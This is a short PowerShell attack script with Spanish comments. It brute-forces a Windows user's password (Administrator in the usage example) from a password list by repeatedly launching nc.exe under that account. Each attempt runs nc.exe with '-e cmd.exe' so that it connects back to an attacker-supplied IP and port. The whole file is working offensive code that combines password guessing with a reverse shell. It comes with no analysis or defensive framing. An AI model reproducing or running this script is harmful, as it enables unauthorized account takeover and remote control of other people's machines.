
# Conseguir una reverse shell mediante fuerza bruta
# Uso .\RunNcWithPasswords.ps1 -NcPath "C:\ruta\a\nc.exe" -PasswordFile "C:\ruta\a\passwords.txt" -Ip "192.168.1.100" -Port "1234" -User "Administrator"

# Parámetros del script
param (
    [string]$NcPath,        # Ruta de nc.exe
    [string]$PasswordFile,  # Ruta del archivo de contraseñas
    [string]$Ip,            # IP a la que se conectará nc.exe
    [string]$Port,          # Puerto al que se conectará nc.exe
    [string]$User           # Usuario para runas
)

# Verifica si se proporcionaron todos los parámetros necesarios
if (-not $NcPath -or -not $PasswordFile -or -not $Ip -or -not $Port -or -not $User) {
    Write-Host "Uso: .\RunNcWithPasswords.ps1 -NcPath 'ruta_de_nc.exe' -PasswordFile 'ruta_del_passwordfile.txt' -Ip 'ip' -Port 'puerto' -User 'usuario'"
    exit 1
}

# Verifica si el archivo de contraseñas existe
if (-not (Test-Path $PasswordFile)) {
    Write-Host "El archivo de contraseñas '$PasswordFile' no existe."
    exit 1
}

# Verifica si nc.exe existe
if (-not (Test-Path $NcPath)) {
    Write-Host "El archivo '$NcPath' no existe."
    exit 1
}

# Lee las contraseñas del archivo
$passwords = Get-Content $PasswordFile

# Intenta cada contraseña
foreach ($password in $passwords) {
    Write-Host "Intentando con la contraseña: $password"

    # Crea un proceso con runas
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $NcPath  # Ejecuta nc.exe directamente
    $processInfo.Arguments = "$Ip $Port -e cmd.exe"  # Argumentos para nc.exe
    $processInfo.UserName = $User  # Usuario proporcionado
    $processInfo.Password = ConvertTo-SecureString $password -AsPlainText -Force
    $processInfo.UseShellExecute = $false
    $processInfo.RedirectStandardError = $true
    $processInfo.RedirectStandardOutput = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processInfo

    try {
        # Inicia el proceso
        $process.Start() | Out-Null
        $process.WaitForExit()

        # Verifica si el proceso se ejecutó correctamente
        if ($process.ExitCode -eq 0) {
            Write-Host "Contraseña correcta. Comando ejecutado."
            exit 0
        } else {
            Write-Host "Contraseña incorrecta o error al ejecutar el comando."
        }
    } catch {
        Write-Host "Error al intentar ejecutar el comando."
    }
}

Write-Host "Todas las contraseñas fallaron."
exit 1
